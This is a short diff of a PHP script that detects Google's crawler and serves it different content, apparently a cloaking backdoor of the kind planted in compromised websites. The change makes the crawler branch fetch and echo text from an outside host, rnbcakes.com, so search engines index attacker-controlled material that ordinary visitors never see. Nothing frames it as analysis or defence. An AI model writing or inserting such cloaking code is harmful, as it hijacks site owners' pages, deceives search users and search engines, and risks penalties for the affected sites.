@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('kiw.html');
+ $bot_content = file_get_contents('https://rnbcakes.com/readme.txt');
  echo $bot_content;
  exit;
 } else {
